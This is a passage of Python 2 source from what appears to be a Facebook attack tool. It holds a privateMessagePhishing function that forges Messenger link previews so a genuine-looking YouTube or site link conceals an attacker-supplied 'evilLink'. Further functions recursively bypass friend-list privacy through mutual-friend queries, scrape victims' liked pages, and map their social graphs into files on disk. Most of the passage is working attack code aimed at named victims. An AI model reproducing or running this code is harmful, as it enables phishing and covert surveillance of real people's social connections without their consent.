            'message_batch[0][is_filtered_content]' : 'false',
            'message_batch[0][is_spoof_warning]' : 'false',
            'message_batch[0][source]' : 'source:titan:web',
            'message_batch[0][body]' : message,
            'message_batch[0][has_attachment]' : 'true',
            'message_batch[0][html_body]' : 'false',
            'message_batch[0][specific_to_list][0]' : 'fbid:' + victim,
            'message_batch[0][content_attachment][subject]' : subject,
            'message_batch[0][content_attachment][app_id]' : '2309869772',
            'message_batch[0][content_attachment][attachment][params][urlInfo][canonical]' : realLink,
            'message_batch[0][content_attachment][attachment][params][urlInfo][final]' : realLink,
            'message_batch[0][content_attachment][attachment][params][urlInfo][user]' : evilLink,
            'message_batch[0][content_attachment][attachment][params][favicon]' : realLink+'/favicon.ico',
            'message_batch[0][content_attachment][attachment][params][title]' : title,
            'message_batch[0][content_attachment][attachment][params][summary]' : summary,
            'message_batch[0][content_attachment][attachment][params][images][0]' : imageLink,
            'message_batch[0][content_attachment][attachment][params][medium]' : '106',
            'message_batch[0][content_attachment][attachment][params][url]' : realLink,
            'message_batch[0][content_attachment][attachment][type]' : '100',
            'message_batch[0][content_attachment][link_metrics][source]' : 'ShareStageExternal',
            'message_batch[0][content_attachment][link_metrics][domain]' : realLink.strip('https://').strip('/'),
            'message_batch[0][content_attachment][link_metrics][base_domain]' : realLink.strip('https://www.').strip('/'),
            'message_batch[0][content_attachment][link_metrics][title_len]' : '38',
            'message_batch[0][content_attachment][link_metrics][summary_len]' : '38',
            'message_batch[0][content_attachment][link_metrics][min_dimensions][0]' : '70',
            'message_batch[0][content_attachment][link_metrics][min_dimensions][1]' : '70',
            'message_batch[0][content_attachment][link_metrics][images_with_dimensions]' : '3',
            'message_batch[0][content_attachment][link_metrics][images_pending]' : '0',
            'message_batch[0][content_attachment][link_metrics][images_fetched]' : '0',
            'message_batch[0][content_attachment][link_metrics][image_dimensions][0]' : '322',
            'message_batch[0][content_attachment][link_metrics][image_dimensions][1]' : '70',
            'message_batch[0][content_attachment][link_metrics][images_selected]' : '1',
            'message_batch[0][content_attachment][link_metrics][images_considered]' : '5',
            'message_batch[0][content_attachment][link_metrics][images_cap]' : '3',
            'message_batch[0][content_attachment][link_metrics][images_type]' : 'ranked',
            'message_batch[0][content_attachment][composer_metrics][best_image_w]' : '100',
            'message_batch[0][content_attachment][composer_metrics][best_image_h]' : '100',
            'message_batch[0][content_attachment][composer_metrics][image_selected]' : '0',
            'message_batch[0][content_attachment][composer_metrics][images_provided]' : '1',
            'message_batch[0][content_attachment][composer_metrics][images_loaded]' : '1',
            'message_batch[0][content_attachment][composer_metrics][images_shown]' : '1',
            'message_batch[0][content_attachment][composer_metrics][load_duration]' : '6',
            'message_batch[0][content_attachment][composer_metrics][timed_out]' : '0',
            'message_batch[0][content_attachment][composer_metrics][sort_order]' : '',
            'message_batch[0][content_attachment][composer_metrics][selector_type]' : 'UIThumbPager_6',
            'message_batch[0][force_sms]' : 'true',
            'message_batch[0][ui_push_phase]' : 'V3',
            'message_batch[0][status]' : '0',
            'message_batch[0][message_id]' : '<1394766424499:3126670212-4125121119@mail.projektitan.com>',
            'message_batch[0][client_thread_id]' : 'user:'+str(c_user),
            'client' : 'web_messenger',
            '__user' : c_user,
            '__a' : '1',
            '__dyn' : '7n8a9EAMBlCFYwyt2u6aOGeExEW9J6yUgByVbGAF4iGGeqheCu6po',
            '__req' : '1n',
            'fb_dtsg' : fb_dtsg,
            'ttstamp' : '26581658074898653',
            '__rev' : '1161243'
            }
        datos = urlencode(arguments)
        response = br.open('https://www.facebook.com/ajax/mercury/send_messages.php',datos)
        
        if globalLogging:
                logs(response.read())
    
    except mechanize.HTTPError as e:
        print e.code
    except mechanize.URLError as e:
            print e.reason.args         
    except:
        print 'Ctrl+c SIGNAL Caught\n'
        return

def privateMessagePhishing(victimId,message,subject,evilLink,videoLink,title,summary,videoID,hijackedVideo):
    c_user = getC_user()
    print str(c_user)+'\n'
    try:
        fb_dtsg = set_dtsg()
        if (fb_dtsg == 0):
            print 'ERROR MOTHER FUCKER -_-'
            
        arguments = {
            'message_batch[0][action_type]' : 'ma-type:user-generated-message',
            'message_batch[0][thread_id]' : '',
            'message_batch[0][author]' : 'fbid:'+str(c_user),
            'message_batch[0][author_email]' : '',
            'message_batch[0][coordinates]' : '',
            'message_batch[0][timestamp]' : '1410457740680',
            'message_batch[0][timestamp_absolute]' : 'Today',
            'message_batch[0][timestamp_relative]' : '10:16am',
            'message_batch[0][timestamp_time_passed]' : '0',
            'message_batch[0][is_unread]' : 'false',
            'message_batch[0][is_cleared]' : 'false',
            'message_batch[0][is_forward]' : 'false',
            'message_batch[0][is_filtered_content]' : 'false',
            'message_batch[0][spoof_warning]' : 'false',
            'message_batch[0][source]' : 'source:titan:web',
            'message_batch[0][body]' : str(message),
            'message_batch[0][has_attachment]' : 'true',
            'message_batch[0][html_body]' : 'false',
            'message_batch[0][specific_to_list][0]' : 'fbid:'+str(victimId),
            'message_batch[0][specific_to_list][1]' : 'fbid:'+str(c_user),
            'message_batch[0][content_attachment][subject]' : str(subject),
            'message_batch[0][content_attachment][app_id]' : '2309869772',
            'message_batch[0][content_attachment][attachment][params][urlInfo][canonical]' : str(videoLink),
            'message_batch[0][content_attachment][attachment][params][urlInfo][final]' : str(videoLink),
            'message_batch[0][content_attachment][attachment][params][urlInfo][user]' : str(evilLink),
            'message_batch[0][content_attachment][attachment][params][urlInfo][log][1408344793]' : 'https://www.mkit.com.ar/',
            'message_batch[0][content_attachment][attachment][params][favicon]' : 'http://s.ytimg.com/yts/img/favicon_32-vflWoMFGx.png',
            'message_batch[0][content_attachment][attachment][params][title]' : str(title),
            'message_batch[0][content_attachment][attachment][params][summary]' : str(summary),
            'message_batch[0][content_attachment][attachment][params][images][0]' : 'http://i1.ytimg.com/vi/'+videoID+'/mqdefault.jpg?feature=og&cfs=1&upscale',
            'message_batch[0][content_attachment][attachment][params][medium]' : '103',
            'message_batch[0][content_attachment][attachment][params][url]' : str(videoLink),
            'message_batch[0][content_attachment][attachment][params][video][0][type]' : 'application/x-shockwave-flash',
            'message_batch[0][content_attachment][attachment][params][video][0][src]' : 'http://www.youtube.com/v/'+str(hijackedVideo)+'?version=3&autohide=1&autoplay=1',
            'message_batch[0][content_attachment][attachment][params][video][0][width]' : '1280',
            'message_batch[0][content_attachment][attachment][params][video][0][height]' : '720',
            'message_batch[0][content_attachment][attachment][params][video][0][secure_url]' : 'https://www.youtube.com/v/'+str(hijackedVideo)+'?version=3&autohide=1&autoplay=1',
            'message_batch[0][content_attachment][attachment][type]' : '100',
            'message_batch[0][content_attachment][link_metrics][source]' : 'ShareStageExternal',
            'message_batch[0][content_attachment][link_metrics][domain]' : 'www.youtube.com',
            'message_batch[0][content_attachment][link_metrics][base_domain]' : 'youtube.com',
            'message_batch[0][content_attachment][link_metrics][title_len]' : str(len(title)),
            'message_batch[0][content_attachment][link_metrics][summary_len]' : str(len(summary)),
            'message_batch[0][content_attachment][link_metrics][min_dimensions][0]' : '70',
            'message_batch[0][content_attachment][link_metrics][min_dimensions][1]' : '70',
            'message_batch[0][content_attachment][link_metrics][images_with_dimensions]' : '1',
            'message_batch[0][content_attachment][link_metrics][images_pending]' : '0',
            'message_batch[0][content_attachment][link_metrics][images_fetched]' : '0',
            'message_batch[0][content_attachment][link_metrics][image_dimensions][0]' : '1280',
            'message_batch[0][content_attachment][link_metrics][image_dimensions][1]' : '720',
            'message_batch[0][content_attachment][link_metrics][images_selected]' : '1',
            'message_batch[0][content_attachment][link_metrics][images_considered]' : '1',
            'message_batch[0][content_attachment][link_metrics][images_cap]' : '10',
            'message_batch[0][content_attachment][link_metrics][images_type]' : 'images_array',
            'message_batch[0][content_attachment][composer_metrics][best_image_w]' : '100',
            'message_batch[0][content_attachment][composer_metrics][best_image_h]' : '100',
            'message_batch[0][content_attachment][composer_metrics][image_selected]' : '0',
            'message_batch[0][content_attachment][composer_metrics][images_provided]' : '1',
            'message_batch[0][content_attachment][composer_metrics][images_loaded]' : '1',
            'message_batch[0][content_attachment][composer_metrics][images_shown]' : '1',
            'message_batch[0][content_attachment][composer_metrics][load_duration]' : '2',
            'message_batch[0][content_attachment][composer_metrics][timed_out]' : '0',
            'message_batch[0][content_attachment][composer_metrics][sort_order]' : '',
            'message_batch[0][content_attachment][composer_metrics][selector_type]' : 'UIThumbPager_6',
            'message_batch[0][force_sms]' : 'true',
            'message_batch[0][ui_push_phase]' : 'V3',
            'message_batch[0][status]' : '0',
            'message_batch[0][message_id]' : '<1410457740680:1367750931-713286099@mail.projektitan.com>',
            'message_batch[0][client_thread_id]' : 'user:'+str(victimId),
            'client' : 'web_messenger',
            '__user' : str(c_user),
            '__a' : '1',
            '__dyn' : '7n8ahyj35CCOadgDxqjdLg',
            '__req' : 'c',
            'fb_dtsg' : fb_dtsg,
            'ttstamp' : '265816977807275100848411568',
            }
        
        datos = urlencode(arguments)
        response = br.open('https://www.facebook.com/ajax/mercury/send_messages.php ',datos)
        
        if globalLogging:
                logs(response.read())
    
    except mechanize.HTTPError as e:
        print e.code
    except mechanize.URLError as e:
            print e.reason.args         
    except:
        print 'Ctrl+c SIGNAL Caught\n'
        return


        
def linkFriends(victim):
    friends = []
    root = 'dumps'
    directory = victim
    delay = 1
    linkedFile = open( os.path.join(root,directory,victim+"friend_links.html"),"wb")
    
    try:
        persons = open( os.path.join(root,directory,victim+".txt") ,"rb")
    except:
        print '\r                                                        \r',
        print '\r %s.txt not exists, error on linkFriends module \r' %victim,
        logs(str(victim)+' not exists, error on linkFriends module')
        return

    while True:
        linea = persons.readline()
        if not linea:
            break
        friends.append(linea.strip("\n\r"))
        
    persons.close()
    
    for individuals in friends:
        try:
            response = br.open('https://graph.facebook.com/'+individuals)
            resultado = response.read()
            json_dump = json.loads(resultado)
            try:
                friend = json_dump['link']+'    '+json_dump['name']+'  '+json_dump['gender']+ '  '+ json_dump['locale']
                print friend
                linkedFile.write(MyParser.htmlFormat(json_dump))
            except:
                try:
                    print 'https://www.facebook.com/%s' %json_dump['username']+'    '+json_dump['name']+'  '+json_dump['gender']+ '  '+ json_dump['locale']
                except:
                    print 'https://www.facebook.com/%s' %individuals
        
        except mechanize.HTTPError as e:
                print e.code
                print 'Sleeping %d' %delay
                sleep(delay)
                delay += 1
        except mechanize.URLError as e:
                print e.reason.args
                print 'Sleeping %d URLerror ' %delay
                sleep(delay)
                delay += 1
    
    linkedFile.close()
    
def getName(userId):
    delay = 0
    while delay < 60:
        try:
            response = br.open('https://graph.facebook.com/'+str(userId))
            resultado = response.read()
            json_dump = json.loads(resultado)
            try:
                return str(json_dump['username'])
            except:
                return str(userId)
        
        except mechanize.HTTPError as e:
                print str(e.code) + 'Increasing delay %d' %delay
                delay += 30 
                sleep(delay)
        except mechanize.URLError as e:
                print str(e.reason.args)  + 'Increasing delay %d' %delay
                delay += 30
                sleep(delay)
                
    #In case the while ends
    return str(userId)


def mkdir(directory,root):
    import os
    
    if os.path.exists(os.path.join(root,directory)):
        return 
    else:
        os.makedirs(os.path.join(root,directory))
         

def saveObjects(victim,matrix,ref):
    path = os.path.join("dumps",victim,"objects",victim)
    f = open(path,"wb")
    pickle.dump(matrix,f)
    g = open(path+'.ref',"wb")
    pickle.dump(ref,g)
    g.close()
    f.close()
    
def loadObjects(victim):
    try:
        path = os.path.join("dumps",victim,"objects",victim)
        f = open(path,"rb")
        A = pickle.load(f)
        g = open( path +'.ref',"rb")
        ref = pickle.load(g)
        g.close()
        f.close()
        return A,ref
    except:
        return [],{}

def reAnalyzeGraph(victim):
    try:
        f = open( os.path.join("dumps",victim,"objects",victim+"-community" ) ,"rb")
        labelGraph = pickle.load(f)
        f.close()
    except:
        logs('Error on reAnalyzeGraph() object not exist')
        print 'Error on reAnalyzeGraph() object not exist\n'
        return
    
    #Community algorithm
    root = 'dumps'
    directory = victim
    
    try:
        partition = community.best_partition(labelGraph)
        
        for i in set(partition.values()):
            print "Community", i
            members = [nodes for nodes in partition.keys() if partition[nodes] == i]
                        
            egonet = labelGraph.subgraph(set(members))
            print sorted(egonet.nodes(),reverse=False)
            print sorted(egonet.edges(),reverse=False)
            
                
            nx.draw_spring(egonet,node_color = np.linspace(0,1,len(egonet.nodes())),edge_color = '#000000' ,with_labels=True)
            plt.savefig( os.path.join(root,directory,victim+"Community"+str(i)+".pdf") )
            plt.savefig( os.path.join(root,directory,victim+"Community"+str(i)+".png") )
            write_dot(egonet, os.path.join(root,directory,victim+"Community"+str(i)+".dot") )		
            plt.show()
           
            
        raw_input('Press enter to continue...\n')
    except:
        logs('Error on reAnalyzeGraph() debbug for more information')
        print 'Error on reAnalyzeGraph() debbug for more information\n'
        return

def analyzeGraph(victim):
    root = 'dumps'
    directory = victim
    mkdir(directory,root)
    
    
    edges = {}
    edgesValues = {}
    nodekeys = {}
    userNames = []
    commonPages = {}
    
    A,idkeys = loadObjects(victim)
    if A != []:       
        
        myGraph = nx.from_numpy_matrix(A)
        
        nodes = myGraph.nodes()
        
        #Percentage
        i = 0.0
        percentage = 0.0
        
        #flush
        print '\r                                                        \r',        
        
        #Dictio creation of usernames
        #Associated with node number
        print 'Attemping to get user\'s information'
        for elements in idkeys.keys():
            try:
                user = getName(elements)
                commonPages[user] = corePagesLike(victim,elements)
                userNames.append(user)
                nodekeys[idkeys[elements]] = user
                percentage = (i * 100.0)/len(idkeys.keys())
                print '\rIterating on %d of %d - [%.2f%%] completed\r' %(i ,len(idkeys.keys()), percentage), 
                i+=1
            except:
                continue
            
        reference = open( os.path.join(root,directory,victim+"references.txt") ,"wb")    
        for users in nodekeys.keys():
            try:
                line = str(nodekeys[users])+' : '+str(users) 
                reference.write(line + '\n')
            except:
                continue
            
        reference.close()
        
        for node in nodes:
            try:
                edges[node] = myGraph.degree(node)
                if edgesValues.has_key(edges[node]):
                    edgesValues[edges[node]].append(node)
                else:
                    edgesValues[edges[node]] = [node]
            except:
                continue
    
        
        for values in sorted(edgesValues.keys(),reverse=True):
            try:
                print str(values) + ' aristas; nodos: ',
                for nodes in edgesValues[values]:
                    print str(nodes) + ', ',
                print '\n'
            except:
                continue
        
        print nx.is_connected(myGraph)
        
        print nx.number_connected_components(myGraph)
        
        ccs = nx.clustering(myGraph)
        print ccs
        print sum(ccs)/len(ccs) 
        
        #Creation of the labeld graph for community
        labelNodes = myGraph.nodes()
        labelEdges = myGraph.edges()
        labelGraph = nx.Graph()
        
        for label in labelNodes:
            try:
                labelGraph.add_node(nodekeys[int(label)],likes=commonPages[nodekeys[int(label)]])
            except:
                continue
            
        for labelE in labelEdges:
            try:
                labelGraph.add_edge(nodekeys[int(labelE[0])],nodekeys[int(labelE[1])])
            except:
                continue
        try:   
            nx.draw_spring(labelGraph,node_color = np.linspace(0,1,len(labelGraph.nodes())),edge_color = np.linspace(0,1,len(labelGraph.edges())) ,with_labels=True)
            plt.savefig( os.path.join(root,directory,victim+"labelGraph_color.pdf") )
            plt.savefig( os.path.join(root,directory,victim+"labelGraph_color.png") )
            write_dot(labelGraph, os.path.join(root,directory,victim+"labelGraph_color.dot") )    
            plt.show()
        except:
            print 'Erro plotting the graph'
        
        #Saving the object for future analysis
        f = open( os.path.join("dumps",victim,"objects",victim+"-community") ,"wb")
        pickle.dump(labelGraph,f)
        f.close()
        
        #Community algorithm
        partition = community.best_partition(labelGraph)
        
        for i in set(partition.values()):
            try:
                print "Community", i
                members = [nodes for nodes in partition.keys() if partition[nodes] == i]
            except:
                continue    
            ''' No longer necessary (?) 
            reference = open(root+"\\"+directory+"\\community"+str(i)+"references.txt","wb")
            
            for nodes in members:
                line = str(nodekeys[int(nodes)])+' : '+str(nodes) 
                reference.write(line + '\n')
            
            reference.close()           
            ''' 
            try:
                egonet = labelGraph.subgraph(set(members))
                print sorted(egonet.nodes(),reverse=False)
                print sorted(egonet.edges(),reverse=False)
                
                    
                nx.draw_spring(egonet,node_color = np.linspace(0,1,len(egonet.nodes())),edge_color = '#000000' ,with_labels=True)
                plt.savefig( os.path.join(root,directory,victim+"Community"+str(i)+".pdf") )
                plt.savefig( os.path.join(root,directory,victim+"Community"+str(i)+".png") )
                write_dot(egonet, os.path.join(root,directory,victim+"Community"+str(i)+".dot") )   			
                plt.show()
            except:
                print 'Error plotting the graph'
           
            
        raw_input('Press enter to continue...\n')
    else:
        logs('Error on analyzeGraph() file not exist')
        print 'Error on analyzeGraph() file not exist\n'
        return
    
    
        
def bypassFriendshipPrivacyPlot(victim, transitive):
   
    coleccion = {}
    nodeID = 0
    
    root = 'dumps'
    directory = str(victim)
    
    mkdir(directory,root)
    
    myGraph = nx.Graph()
    
    coleccion[victim] = nodeID
    
    victima = nodeID
    myGraph.add_node(victima)
    nodeID += 1
    
    
    #Percentage container
    percentage = 0.0
    #Disclosude friends container
    friendships = []
    #Already visited nodes container
    visited = []  
    try:
        #If the file already exists 
        friendshipFile = open( os.path.join(root,directory,victim+".txt") ,"rb")
        #Reads every line of the file
        while True:
            linea = friendshipFile.readline()
            if not linea:
                break
            #Store in the visited array for non repetition
            visited.append(linea.strip("\n\r"))
        friendshipFile.close()
        A,coleccion = loadObjects(victim)
        if A == []:
            logs("Inconsistency, the userid file exists, but has no object associated")
            print "Inconsistency, the userid file exists, but has no object associated"
            return
        else:
            myGraph = nx.from_numpy_matrix(A)
    
    except:
        #If the file does not exists, creates the file
        friendshipFile = open( os.path.join(root,directory,victim+".txt") ,"wb")
        friendshipFile.close()
     
    
    try:
        #Generates the first level of the search
        result = coreFriendshipPrivacy(victim,transitive)
    except:
        print 'Check the internet connection please..'
        return
    
    #Stores non repetitive values in the disclosed friends container
    for individuos in result:
        if individuos not in visited:
            if coleccion.has_key(individuos) == False:
                nodo = nodeID
                nodeID += 1
                coleccion[individuos] = nodo
            else:
                nodo = coleccion[individuos]
            
            if coleccion.has_key(transitive) == False:
                transitivo = nodeID
                nodeID += 1
                coleccion[transitive] = transitivo
            else:
                transitivo = coleccion[transitive]
            
            myGraph.add_node(nodo)
            myGraph.add_edge(nodo,transitivo)
            friendships.append(individuos)
    
    #Counter for percentage calculus purpose 
    i = 0.0
    #flush
    print '\r                                                        \r',
    #For every value in the first disclosed list, repeats until every value has been tryed    
    for friends in friendships:
        #Percentage calculus 
        percentage = (i * 100.0)/len(friendships)
        
        print '\rIterating on %d of %d - [%.2f%%] completed\r' %(i ,len(friendships), percentage), 
        i+=1
        #Only if the node wasn't visited 
        if friends not in visited:
            #if coreFriendshipPrivacy() fails, an exception is caught. Therefore, state wis still being True. 
            #Only if the try passes, the infinite while will end. (For internet error connection problem)
            state = True
            while state == True:
                try:
                    result = coreFriendshipPrivacy(victim,friends)
                    state = False
                except signalCaught as e:
                    state = False
                    print 'Signal Caught handler'
                    print '%s ' %e.args[0]
                    return
                except:
                    logs('Check the internet connection please.. Press enter when it\'s done')
                    print '\r                                                                       \r',
                    raw_input('\rCheck the internet connection please.. Press enter when it\'s done\r'),
            
            #Stores non repetitive values in the disclosed friends container    
            for element in result:
                if element not in friendships:
                    if coleccion.has_key(friends) == False:
                        nodo = nodeID
                        nodeID += 1
                        coleccion[friends] = nodo
                    else:
                        nodo = coleccion[friends]
                    
                    if coleccion.has_key(element) == False:
                        transitivo = nodeID
                        nodeID += 1
                        coleccion[element] = transitivo
                    else:
                        transitivo = coleccion[element]

                    myGraph.add_node(nodo)
                    myGraph.add_edge(nodo,transitivo)
                    friendships.append(element)
            
            #Stores every single value of friendships list alredy analyzed for non repetitivness
            visited.append(friends)
            
    #Check if the file exists, if true append, else create and writes
    try:
        friendshipFile = open( os.path.join(root,directory,victim+".txt") ,"ab")
    except:
        friendshipFile = open( os.path.join(root,directory,victim+".txt") ,"wb")
    #Stores every userID for further analyzis
    for friends in friendships:
        if coleccion.has_key(friends) == False:
            transitivo = nodeID
            nodeID += 1
            coleccion[friends] = transitivo
        else:
            transitivo = coleccion[friends]

        myGraph.add_edge(victima,transitivo)
        friendshipFile.write(str(friends)+'\n')
    
    
    friendshipFile.close()
    
    mkdir('objects', os.path.join(root,directory))
    A = nx.adj_matrix(myGraph)
    saveObjects(victim, A, coleccion)
    
    nx.draw_spring(myGraph,node_color = np.linspace(0,1,len(myGraph.nodes())),edge_color = np.linspace(0,1,len(myGraph.edges())) ,with_labels=True)
    plt.savefig( os.path.join(root,directory,victim+"graph_color.pdf") )
    plt.savefig( os.path.join(root,directory,victim+"graph_color.png") )
    write_dot(myGraph,os.path.join(root,directory,victim+"graph_color.dot"))  
    plt.show()

   
    
def bypassFriendshipPrivacy(victim, transitive):
    #Percentage container
    percentage = 0.0
    #Disclosude friends container
    friendships = []
    #Already visited nodes container
    visited = []  
    try:
        #If the file already exists 
        friendshipFile = open( os.path.join("dumps",victim+".txt") ,"rb")
        #Reads every line of the file
        while True:
            linea = friendshipFile.readline()
            if not linea:
                break
            #Store in the visited array for non repetition
            visited.append(linea.strip("\n\r"))
    
        friendshipFile.close()
    
    except:
        #If the file does not exists, creates the file
        friendshipFile = open( os.path.join("dumps",victim+".txt") ,"wb")
        friendshipFile.close()
     
    
    try:
        #Generates the first level of the search
        result = coreFriendshipPrivacy(victim,transitive)
    except:
        print '\r                                                                        \r',
        raw_input('\rCheck the internet connection please.. Press enter when it\'s done\r'),
        return
    
    #Stores non repetitive values in the disclosed friends container
    for individuos in result:
        if individuos not in visited:
            friendships.append(individuos)
    
    #Counter for percentage calculus purpose 
    i = 0.0
    #flush
    print '\r                                                        \r',
    #For every value in the first disclosed list, repeats until every value has been tryed    
    for friends in friendships:
        #Percentage calculus 
        percentage = (i * 100.0)/len(friendships)
        print '\rIterating on %d of %d - [%.2f%%] completed\r' %(i ,len(friendships), percentage), 
        i+=1
        #Only if the node wasn't visited 
        if friends not in visited:
            #if coreFriendshipPrivacy() fails, an exception is caught. Therefore, state wis still being True. 
            #Only if the try passes, the infinite while will end. (For internet error connection problem)
            state = True
            while state == True:
                try:
                    result = coreFriendshipPrivacy(victim,friends)
                    state = False
                except signalCaught as e:
                    state = False
                    print 'Signal Caught handler'
                    print '%s ' %e.args[0]
                    return
                except:
                    print '\r                                                        \r',
                    raw_input('\rCheck the internet connection please..\r'),
            
            #Stores non repetitive values in the disclosed friends container    
            for element in result:
                if element not in friendships:
                    friendships.append(element)
            
            #Stores every single value of friendships list alredy analyzed for non repetitivness
            visited.append(friends)
            
    #Check if the file exists, if true append, else create and writes
    try:
        friendshipFile = open( os.path.join("dumps",victim+".txt") ,"ab")
    except:
        friendshipFile = open( os.path.join("dumps",victim+".txt") ,"wb")

    #Stores every userID for further analyzis
    for friends in friendships:
        friendshipFile.write(str(friends)+'\n')
    
    friendshipFile.close()

def corePagesLike(victim,transitive):
    matchs = []
    begin = 0
    page = []
    
    try:
        response = br.open('https://www.facebook.com/'+str(victim)+'?and='+str(transitive)+'&sk=favorites')
        resultado = response.read()
        match = re.search('timelineFriendsColumnHeader',resultado)
        if match is not None:
            linea = re.search('timelineFriendsColumnHeader(.+)',resultado).group()

    except mechanize.HTTPError as e:
            print e.code
            #Should handle a custom error
            raise
    except mechanize.URLError as e:
            print e.reason.args
            #Should handle a custom error
            raise
    #Error connection the upper function will catch the exception
    except:
        raise
    
    while True:
        match = re.search('fbStreamTimelineFavInfoContainer',resultado[begin:])
        if match != None:
            matchEnd = re.search('\n',resultado[begin+match.start():])
            if matchEnd != None:
                matchs.append(resultado[begin+match.start():matchEnd.end()+begin+match.start()])
                begin = matchEnd.end()+begin+match.start()
                match = None
                matchEnd = None
        else:
            break
    
    
    for linea in matchs:
        start = 0
        try:
            #Search the string to get the position of the starting match
            matchAnd = re.search('page\.php\?id=',linea[start:])
            #Search the end of the match for taking the id length
            matchEnd = re.search('">',linea[start+matchAnd.end():])
            #If we have a start and an end, we have the id value
        except:
            print 'ERROR'
            
        
        if (matchAnd and matchEnd) is not None:
            #Appends the value given the proper position (resolved a few lines up)
            page.append(linea[start+matchAnd.end():start+matchEnd.start()+matchAnd.end() ])
            #Moves the pointer for next match
            start += matchEnd.start()+matchAnd.end() 
    return page

def checkPrivacy(victim):
    try:
            response = br.open('https://www.facebook.com/'+str(victim)+'?sk=friends')
            resultado = response.read()
            match = re.search('All Friends',resultado)
            matchBis = re.search('Todos los amigos',resultado)
            matchBisBis = re.search('Todos mis amigos',resultado)
            if ((match is not None) or (matchBis is not None) or (matchBisBis is not None)):
                matchFriends = re.search('_1qp6(.+)"',resultado).group()
                return matchFriends 
            else:
                return -1
    except:
        print 'Error in the process, brute force will be applied ..'
        return -1
    
def simpleGraph(friends, victim):
    coleccion = {}
    nodeID = 0

    root = 'dumps'
    directory = str(victim)
    
    mkdir(directory,root)
    
    myGraph = nx.Graph()
    
    coleccion[victim] = nodeID
    
    victima = nodeID
    myGraph.add_node(victima)
    nodeID += 1
    #Check if the file exists, if true append, else create and writes
    try:
        friendshipFile = open( os.path.join(root,directory,victim+".txt"),"ab")
    except:
        friendshipFile = open( os.path.join(root,directory,victim+".txt"),"wb")

    for friend in friends:
        
        friendshipFile.write(str(friend)+'\n')
        
        try:
            mutual = coreFriendshipPrivacy(victim, friend)
        except:
            continue
        
        coleccion[friend] = nodeID
        nodeID += 1
        
        if myGraph.has_node(friend) != True:
            myGraph.add_node(friend)
        
            
        if myGraph.has_edge(victima, friend) != True:
            myGraph.add_edge(victima, friend)

        for element in mutual:
            if myGraph.has_node(element) != True:
                myGraph.add_node(element)
                myGraph.add_edge(element, friend)
        
    friendshipFile.close()
    
    mkdir('objects',root+'\\'+directory)
    
    A = nx.adj_matrix(myGraph)
    saveObjects(victim, A, coleccion)
    
    nx.draw_spring(myGraph,node_color = np.linspace(0,1,len(myGraph.nodes())),edge_color = np.linspace(0,1,len(myGraph.edges())) ,with_labels=True)
    plt.savefig( os.path.join(root,directory,victim+"graph_color.pdf") )
    plt.savefig( os.path.join(root,directory,victim+"graph_color.png") )
    write_dot(myGraph,os.path.join(root,directory,victim+"graph_color.dot"))  
    plt.show()
    
def friendshipPlot(text,victim):
    friends = []
    friendsID = []
    counter = 0
    lastId = 0
    while counter < 4:
        matchStart = re.search("_5q6s _8o _8t lfloat _ohe\" href=\"https://www.facebook.com/",text)
        if matchStart is not None:
            start = matchStart.end()
            matchEnd = re.search("\?",text[start:])
            name = text[start:matchEnd.start()+start]
            if (name not in friends) and (name != "profile.php"):
                friends.append(name)
                fbid = getUserID(name)
                if fbid is not -1:
                    friendsID.append(fbid)
            text = text[matchEnd.start()+start:]
        else:
            try:
                c_user = getC_user()
                userId = getUserID(victim)
                if getUserID(friends[len(friends)-1]) == lastId:
                    counter += 1
                lastId = getUserID(friends[len(friends)-1])
                encoded = b64encode('0:not_structured:'+str(lastId))
                response = br.open('https://www.facebook.com/ajax/pagelet/generic.php/AllFriendsAppCollectionPagelet?data={"collection_token":"'+userId+':2356318349:2","cursor":"'+encoded+'","tab_key":"friends","profile_id":'+userId+',"q":"'+victim+'","overview":false,"ftid":null,"order":null,"sk":"friends","importer_state":null}&__user='+c_user+'&__a=1&__dyn=7n8apij2qmp5zpQ9UoHbgWyxi9ACwKyaF299qzCAjFDxCm&__req=7&__rev=1183274')
                to_parse = str(response.read()).strip('for (;;);')
                try:
                    #Converts the json web response to a python like object
                    json_dump = json.loads(to_parse)
                    text = json_dump["payload"]
                except:
                    print 'Error on json loading' 
                
            except:
                print 'ERROR MOTHER FUCKER'
    return friendsID, friends

def coreFriendshipPrivacy(victim,transitive):
    friends = []
    try:
        response = br.open('https://www.facebook.com/'+str(victim)+'?and='+str(transitive)+'&sk=friends')
        resultado = response.read()
        match = re.search('timelineFriendsColumnHeader',resultado)
        if match is not None:
            linea = re.search('timelineFriendsColumnHeader(.+)',resultado).group()


    except mechanize.HTTPError as e:
            print e.code
            #Should handle a custom error
            raise
    except mechanize.URLError as e:
            print e.reason.args
            #Should handle a custom error
            raise
    #Error connection the upper function will catch the exception
    except:
        raise

    #Offset for the string search 
    start = 0
    #While line matches the searched values
    while True:
        try:
            #Search the string to get the position of the starting match
            matchAnd = re.search('user\.php\?id=',linea[start:])
            #Search the end of the match for taking the id length
            matchEnd = re.search('&amp',linea[start+matchAnd.end():])
            #If we have a start and an end, we have the id value   
            if (matchAnd and matchEnd) is not None:
                #Appends the value given the proper position (resolved a few lines up)
                toUserID = linea[start+matchAnd.end():start+matchEnd.start()+matchAnd.end()]
                if toUserID not in friends:
                    friends.append(toUserID)
                #Moves the pointer for next match
                start += matchEnd.start()+matchAnd.end()
        #If the match ends (Equals of end of the line for the search)
        except:
            #Search for more friends (Ajax controled)
            match = re.search('/ajax/browser/list/mutualfriends/',resultado)
            if match is not None:
                #Call for the extendend friend search module
                extend = seeMore(len(friends),victim,transitive)
                #Return the merge of the lists
                return list(set(extend + friends))
            else:
                #In case there are no more friends, returns the original list
                return friends

def seeMore(start,victim,transitive):
    #vitimId and transitiveId needs to be IDS, instead of usernames. Is like a cast from the username to the Id
    #doesn't matter if the given argument is already the id.
    victimId = getUserID(victim)
    transitiveId = getUserID(transitive)
    #Disclosed friends container
    extendedFriends = []
    
    if (victimId == -1) or (transitiveId == -1):
        return extendedFriends
    
    
    #While there friends to disclosed in the particular union set
    while True:
        
        try:
            response = br.open('https://www.facebook.com/ajax/browser/list/mutualfriends/?uid='+str(transitiveId)+'&view=grid&location=other&infinitescroll=0&short=1&node='+str(victimId)+'&start='+str(start)+'&__user='+str(getC_user())+'&__a=1&__dyn=7n8ahyj35zolgDxqihXzA&__req=6')
        except mechanize.HTTPError as e:
            print e.code
        except mechanize.URLError as e:
            print e.reason.args
        except:
            raise
        
        #Strips the web response for further processes
        to_parse = str(response.read()).strip('for (;;);')
        
        try:
            #Converts the json web response to a python like object
            json_dump = json.loads(to_parse)
        except:
            print 'Error on json loading'
            #For non-blocking excecution - The upper function is excpecting a list to be returned
            return extendedFriends
        
